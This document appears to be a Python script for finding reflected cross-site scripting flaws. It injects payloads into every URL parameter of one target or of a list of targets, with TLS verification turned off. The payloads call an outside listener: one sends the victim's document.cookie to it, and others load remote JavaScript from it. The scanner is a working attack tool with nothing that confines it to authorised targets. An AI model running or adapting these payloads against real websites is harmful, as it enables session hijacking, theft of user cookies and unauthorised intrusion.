#!/usr/bin/env python3

import requests
import urllib.parse


# ============================================================
# PAYLOADS (NGROK-BASED)
# ============================================================

def generate_payloads(listener):
    return [
        f'<script src="{listener}/x.js"></script>',
        f'<img src=x onerror=fetch("{listener}/?c="+document.cookie)>',
        f'<svg/onload=fetch("{listener}/xss")>',
        f'"><script src="{listener}/p.js"></script>',
        f"'><img src=x onerror=fetch('{listener}/steal')>"
    ]


# ============================================================
# PARAM DISCOVERY
# ============================================================

def extract_params(url):
    parsed = urllib.parse.urlparse(url)
    query = urllib.parse.parse_qs(parsed.query)

    return parsed, query


def rebuild_url(parsed, params):
    query = urllib.parse.urlencode(params, doseq=True)
    return urllib.parse.urlunparse(parsed._replace(query=query))


# ============================================================
# XSS SCANNER (SMART)
# ============================================================

def run_xss_scan_single(url, listener):

    print("\n[ XSS SCAN (SINGLE TARGET) ]")

    payloads = generate_payloads(listener)

    parsed, params = extract_params(url)

    if not params:
        print("[!] No parameters found in URL")
        return

    found = set()

    for param in params:

        print(f"\n[+] Testing parameter: {param}")

        for payload in payloads:

            test_params = params.copy()
            test_params[param] = payload

            target = rebuild_url(parsed, test_params)

            print(f"    -> {target}")

            try:
                r = requests.get(target, timeout=5, verify=False)

                if payload in r.text or urllib.parse.unquote(payload) in r.text:
                    print(f"[VULNERABLE] {target}")
                    found.add(target)

            except requests.exceptions.RequestException:
                print(f"[ERROR] Request failed")

    print("\n========== RESULTS ==========")

    if found:
        for x in found:
            print(x)
    else:
        print("No XSS found.")


# ============================================================
# FILE MODE (OLD MODE STILL SUPPORTED)
# ============================================================

def run_xss_scan_file(urls_file, listener):

    print("\n[ XSS SCAN (FILE MODE) ]")

    payloads = generate_payloads(listener)

    with open(urls_file) as f:
        urls = [u.strip() for u in f if u.strip()]

    for url in urls:
        run_xss_scan_single(url, listener)